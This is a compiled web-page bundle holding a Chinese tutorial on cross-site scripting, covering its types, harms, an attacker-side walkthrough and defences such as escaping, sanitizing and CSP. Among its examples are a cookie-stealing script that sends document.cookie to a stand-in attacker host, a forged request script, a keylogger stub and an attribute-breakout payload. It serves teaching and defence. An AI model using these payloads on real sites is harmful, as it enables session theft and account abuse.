(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{174:function(t,s,a){"use strict";a.r(s);var e=a(0),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"xss-——-注入攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-——-注入攻击"}},[t._v("#")]),t._v(" XSS —— 注入攻击")]),t._v(" "),a("p",[t._v("Cross Site Scripting，直译过来叫“跨站脚本攻击”，如果缩写为CSS会与层叠样式表（Cascading Style Sheet）冲突，所以缩写为XSS。")]),t._v(" "),a("p",[a("strong",[t._v("注入恶意代码，是XSS攻击的特征。")])]),t._v(" "),a("p",[t._v("因为恶意代码被注入到了目标站点上，所以XSS可以在不违反浏览器同源策略的条件下进行信息泄露等恶意行为，危害十分严重。")]),t._v(" "),a("p",[t._v("关于为什么叫“跨站脚本攻击”而不叫“代码注入攻击”，这其实是历史原因。根据wikipedia上给出的解释，XSS这个名字最早出自2000年微软安全工程师的安全报告，当时XSS被用来描述一种从无关页面跳转到被攻击页面的攻击行为，随后攻击方式不断进化，而XSS这个名字被沿用了下来成了web应用代码注入攻击的统称。")]),t._v(" "),a("h1",{attrs:{id:"什么是relected-xss、stored-xss、dom-based-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#什么是relected-xss、stored-xss、dom-based-xss"}},[t._v("#")]),t._v(" 什么是Relected XSS、Stored XSS、DOM-based XSS")]),t._v(" "),a("p",[t._v("主流观点将XSS攻击分为Related XSS（反射型）、Stored XSS（持久型）和DOM-based XSS（DOM型）。那么这三种是什么意思呢？")]),t._v(" "),a("p",[t._v("在传统的服务端渲染web应用中，source文件是由浏览器向服务端得请求到的，就像下面这样：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("          1. request\n+------+ -----------\x3e +------+\n|client|              |server|\n+------+ <----------- +------+\n          2. response\n")])])]),a("p",[t._v("js和css比较固定，算是静态资源通常不会动态生成，而html则通常是由后端使用模板引擎动态拼接生成的，因此注入过程都是发生在这里。")]),t._v(" "),a("p",[t._v("拼接html的数据来源有两种，一种是后端数据库里保存的数据，另一种是HTTP请求里包含的信息。")]),t._v(" "),a("p",[t._v("第一种比较好理解，常见的场景包括用户的个人介绍、头像等。")]),t._v(" "),a("div",{staticClass:"language-ejs extra-class"},[a("pre",{pre:!0,attrs:{class:"language-ejs"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  Hello, "),a("span",{pre:!0,attrs:{class:"token ejs language-ejs"}},[a("span",{pre:!0,attrs:{class:"token delimiter punctuation"}},[t._v("<%=")]),a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v(" user"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("name ")]),a("span",{pre:!0,attrs:{class:"token delimiter punctuation"}},[t._v("%>")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("如果用户故意构造一个恶意的用户名，比如"),a("code",[t._v("<script>alert(1)<\/script>")]),t._v("，那么产生的html片段就会是")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  Hello, "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")])])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("由于注入的恶意代码保存在数据库中，能稳定存在，所以这种方式叫做持久型XSS。")]),t._v(" "),a("p",[t._v("第二种基本就是url的query的回显，比如在搜索场景比较常见：")]),t._v(" "),a("div",{staticClass:"language-ejs extra-class"},[a("pre",{pre:!0,attrs:{class:"language-ejs"}},[a("code",[t._v("您搜索的关键词是："),a("span",{pre:!0,attrs:{class:"token ejs language-ejs"}},[a("span",{pre:!0,attrs:{class:"token delimiter punctuation"}},[t._v("<%=")]),a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v(" window"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("location"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("query"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("key ")]),a("span",{pre:!0,attrs:{class:"token delimiter punctuation"}},[t._v("%>")])]),t._v("\n")])])]),a("p",[t._v("这里的恶意代码来源于url中的query部分，如果我们构造一个恶意地址，就可以实现一样的攻击效果。因为注入的恶意代码是在url里，所以与前一种最大的不同是无法稳定存在，必须诱惑用户点击恶意url。这种方式叫做反射型XSS。")]),t._v(" "),a("p",[t._v("为什么叫反射型呢？打个比方，现在面前有一面镜子，你拿着激光笔朝着镜子照射，反射的光线的朝向是由入射光线决定的。同样地，向server端请求html，返回的结果是由url的query决定的，这种形式，就像是在反射光线一样。")]),t._v(" "),a("p",[t._v("可以看到，这两种XSS都是发生在服务端的。为了解决XSS人们提出了很多办法，比如在服务端对拼接好的html内容做转义和过滤等，破坏掉其中可能注入代码的地方，比如将"),a("code",[t._v("<")]),t._v("转义为"),a("code",[t._v("&lt;")]),t._v("。")]),t._v(" "),a("p",[t._v("后来随着前端发展，很多页面的DOM元素是在前端生成的。与后端渲染类似的，此时就出现了注入的可能。比如：")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("onChange")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("userName")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("getElementById")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'username'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("innerHTML "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" userName"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("如果userName是一段恶意代码，这段代码就会被注入进页面中，因为这个注入过程发生在前端，所以之前介绍的在后端做的XSS防范这里将无法生效。因为比较特殊，所以这种XSS被单独分离出来，称作DOM-based XSS。")]),t._v(" "),a("p",[t._v("综上：")]),t._v(" "),a("ol",[a("li",[t._v("反射型。恶意代码来自url")]),t._v(" "),a("li",[t._v("持久型。恶意代码来自数据库")]),t._v(" "),a("li",[t._v("DOM型。注入行为发生在浏览器。")])]),t._v(" "),a("h1",{attrs:{id:"常见的xss危害举例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#常见的xss危害举例"}},[t._v("#")]),t._v(" 常见的XSS危害举例")]),t._v(" "),a("p",[t._v("XSS的后果非常严重，想象一下，如果页面上的脚本可以被随意更改，那几乎什么事情都有可能发生。")]),t._v(" "),a("ol",[a("li",[t._v("盗取cookie。比如：")])]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 通过动态构造一个img标签，将当前页面的cookie发送给attack.com")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Image")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://attacker.ip/"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("ol",{attrs:{start:"2"}},[a("li",[t._v("伪造请求。有些cookie是http-only的无法得到，那就直接在源站发起请求。比如下面的例子，伪造用户调用sendEmail接口发送邮件。")])]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" xhr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("XMLHttpRequest")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\nxhr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'POST'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://victim.com/api/sendEmail'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\nxhr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("setRequestHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Content-type'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'application/x-www-form-urlencoded'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\nxhr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("send")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'email=xxxx@example.com&content=test'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("ol",{attrs:{start:"3"}},[a("li",[a("p",[t._v("钓鱼。在页面上动态动态伪造表单诱使用户填写，比如动态构造一个需要二次确认密码的弹窗。")])]),t._v(" "),a("li",[a("p",[t._v("监听键盘事件。比如：")])])]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function-variable function"}},[t._v("onkeypress")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("e")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("...")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 将键盘信息发送给攻击者")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("ol",{attrs:{start:"5"}},[a("li",[t._v("泄露隐私信息。比如盗取当前页面中用户的电话、账号、住址等信息。")])]),t._v(" "),a("h1",{attrs:{id:"xss的攻击举例（攻击者角度）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss的攻击举例（攻击者角度）"}},[t._v("#")]),t._v(" XSS的攻击举例（攻击者角度）")]),t._v(" "),a("p",[t._v("这里以反射型XSS举例，因为反射型和持久型区别不大，而DOM型只是另一个名字，本质上跟反射型和持久型区别不大。")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("找出可注入对象")]),t._v(" "),a("p",[t._v("最常见的就是url里的query，其他任何HTTP请求里的东西其实都可以拿来尝试，比如各种header。")]),t._v(" "),a("p",[t._v("假如有一个url"),a("code",[t._v("http://victim.com/?q=123")]),t._v("，"),a("code",[t._v("q")]),t._v("是一个可注入对象。")]),t._v(" "),a("p",[t._v("这个过程可能没那么容易，因为不是所有的可注入对象都很容易发现，也许会用到一些扫描工具。")])]),t._v(" "),a("li",[a("p",[t._v("寻找注入点")]),t._v(" "),a("p",[t._v("构造一些随机值作为query，比如上一步发现的"),a("code",[t._v("q")]),t._v("，那就构造一个url让"),a("code",[t._v("q")]),t._v("等于一个随机值（比如"),a("code",[t._v("4018989734009937")]),t._v("），然后用浏览器的调试工具在整个DOM树中搜索，看看出现在了哪里。")]),t._v(" "),a("p",[t._v("这个过程通常也没那么简单，因为query里的东西未必直接反映在了DOM元素中。可以借助一些自动化工具，对页面DOM变化进行监听和比对。有时候甚至需要借助浏览器的调试工具对js代码打断点调试分析。")])]),t._v(" "),a("li",[a("p",[t._v("构造恶意参数")]),t._v(" "),a("p",[t._v("如果找到了反射的位置，观察一下四周的环境（比如是否处于引号内部，是否是属性值），然后针对性地构造恶意参数。")]),t._v(" "),a("p",[t._v("例如发现了一个img标签：")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("4018989734009937"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n")])])]),a("p",[t._v("那么就可以构造"),a("code",[t._v("q")]),t._v("等于"),a("code",[t._v('"/><script>alert(1)<\/script>')]),t._v("（当然需要encodeURI），将其带入url中进行测试看是否能够触发。")])]),t._v(" "),a("li",[a("p",[t._v("不断尝试，重复步骤3")]),t._v(" "),a("p",[t._v("由于大部分站点或多或少都会对XSS采取一定的防范措施，所以通常构造恶意参数这个过程需要不断尝试，有经验的攻击者会通过构造不同的参数，观察他们的响应情况来推测XSS的防护策略，然后进一步调整构造新的攻击参数。比如"),a("a",{attrs:{href:"https://blog.csdn.net/qq_29277155/article/details/51320064",target:"_blank",rel:"noopener noreferrer"}},[t._v("这篇博客"),a("OutboundLink")],1),t._v("中提到的一些绕过XSS防护的技巧。此外由于开发者通常选择市面上现有的XSS防护工具进行保护，也可以寻找主流防护工具方案的漏洞进行尝试（可见及时打安全补丁多么重要）。")]),t._v(" "),a("p",[t._v("这个步骤通常会利用各种自动化工具。")])])]),t._v(" "),a("h1",{attrs:{id:"如何预防"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何预防"}},[t._v("#")]),t._v(" 如何预防")]),t._v(" "),a("p",[t._v("关于如何预防XSS，基本上有两个思路：")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("转义（escape）")]),t._v(" "),a("p",[t._v("转义的做法是在展示的地方，对HTML内容做一次转换，将其中的"),a("code",[t._v("<")]),t._v("，"),a("code",[t._v(">")]),t._v("等敏感字符转译成其他字符，例如将"),a("code",[t._v("<script>alert(0);<\/script>")]),t._v("转译成"),a("code",[t._v("&lt;script&gt;alert(0);&lt;/script&gt;")]),t._v("。这样就无法产生可执行的脚本，都是展示性的。具体的转义规则是：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("& --\x3e &amp;\n< --\x3e &lt;\n> --\x3e &gt;\n\" --\x3e &quot;\n' --\x3e &#x27;\n/ --\x3e &#x2F;\n")])])]),a("p",[t._v("上面提到的转义只针对的是那些“展示”的地方。对于非展示的地方，同样需要转义，例如：")]),t._v(" "),a("p",[t._v("html标签属性")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("attr")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),t._v("这里需要转义")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("content"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("script标签内部的数据（pugjs为例）")]),t._v(" "),a("div",{staticClass:"language-pug extra-class"},[a("pre",{pre:!0,attrs:{class:"language-pug"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token multiline-script"}},[t._v("\n  window"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("initData "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" #"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("这里需要转义"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),t._v("\n")])])]),a("p",[t._v("css的url、behavior属性")]),t._v(" "),a("div",{staticClass:"language-css extra-class"},[a("pre",{pre:!0,attrs:{class:"language-css"}},[a("code",[a("span",{pre:!0,attrs:{class:"token selector"}},[t._v(".container")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token property"}},[t._v("background")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token url"}},[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v('"这里需要转义"'),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("当然还有其他很多地方，具体可以参考OWASP的"),a("a",{attrs:{href:"https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#XSS_Prevention_Rules",target:"_blank",rel:"noopener noreferrer"}},[t._v("cheatsheet"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("怎么转义呢？开发者没必要自己实现转义逻辑，使用自动转义的模板引擎或是前端框架通常就能实现大部分的转义工作了。")]),t._v(" "),a("p",[t._v("那么，是否有了转义就可以避免XSS了呢？答案是否定的！因为有些时候我们是允许合法的拼接html片段的，比如带格式的富文本场景，总不能转义了以后格式都不让显示了吧。")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("strong")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("这里是重点"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("strong")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v(" <-- 带有格式的富文本\n")])])])]),t._v(" "),a("li",[a("p",[t._v("过滤（sanitize）")]),t._v(" "),a("p",[t._v("过滤正好弥补了前面的转义无法处理的问题。")]),t._v(" "),a("p",[t._v("想法其实很简单，就是基于规则过滤掉输入中有危险的部分，比如只保留"),a("code",[t._v("div")]),t._v("，"),a("code",[t._v("table")]),t._v("等安全的标签，去掉"),a("code",[t._v("script")]),t._v("等危险的标签或属性。具体的规则是什么需要具体问题具体分析，既不能定得太严格以至于影响用户的正常使用，又不能定得太宽松容易被轻松绕过。")]),t._v(" "),a("p",[t._v("不过这样正式过滤的问题所在，既然是规则，就存在被绕过的可能。比如规则是过滤script标签：")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sanitize")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("content")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  content"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/script/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("那么上面的过滤对于ScRiPt就无能为力了。")]),t._v(" "),a("p",[t._v("有很多好用的过滤器工具，开发者没必要也不应该自己去实现过滤逻辑。比如"),a("a",{attrs:{href:"https://github.com/mganss/HtmlSanitizer",target:"_blank",rel:"noopener noreferrer"}},[t._v("c# html sanitizer"),a("OutboundLink")],1),t._v("，"),a("a",{attrs:{href:"https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project",target:"_blank",rel:"noopener noreferrer"}},[t._v("java html sanitizer"),a("OutboundLink")],1),t._v("，"),a("a",{attrs:{href:"https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("ruby html sanitizer"),a("OutboundLink")],1),t._v("等等。")])])]),t._v(" "),a("p",[t._v("除了以上两个思路，还有一些其他手段。")]),t._v(" "),a("ol",{attrs:{start:"3"}},[a("li",[a("p",[t._v("HTTP response使用X-XSS-Protection头部")]),t._v(" "),a("p",[t._v("开启这个头部，可以让浏览器开启保护功能，加载页面时自动sanitize或是发现XSS行为时停止加载。目前主流的浏览器默认都开启了XSS保护功能，所以这个HTTP头部已经没那么重要了。不过最新版的chrome移除了XSS Auditor功能。。")])]),t._v(" "),a("li",[a("p",[t._v("启用Content-Script-Policy（CSP）")]),t._v(" "),a("p",[t._v("CSP主要的作用是告诉浏览器，当前页面只允许从什么样的地方加载资源，如果限制了只允许从安全的来源加载资源，就认为可以有效的防止XSS，因为XSS的注入代码通常是外部引入的。")]),t._v(" "),a("p",[t._v("CSP可以在HTTP response的header或是html页面的meta标签里开启。比如header的例子：")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Content-Security-Policy: default-src http://victim.com\n")])])]),a("p",[t._v("这个配置意思是页面中所有的内容都必须来自http://victim.com，此外CSP还可以实现更细粒度的控制，比如脚本的来源、媒体资源的来源、匹配多个域名等。详细内容参考"),a("a",{attrs:{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",target:"_blank",rel:"noopener noreferrer"}},[t._v("这篇MDN的文档"),a("OutboundLink")],1),t._v("。")])])]),t._v(" "),a("p",[t._v("有些办法虽然无法帮助避免XSS，但是可以降低XSS后的损失。比如将cookie设置为http-only。")]),t._v(" "),a("h1",{attrs:{id:"xss-in-react"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-in-react"}},[t._v("#")]),t._v(" XSS in React")]),t._v(" 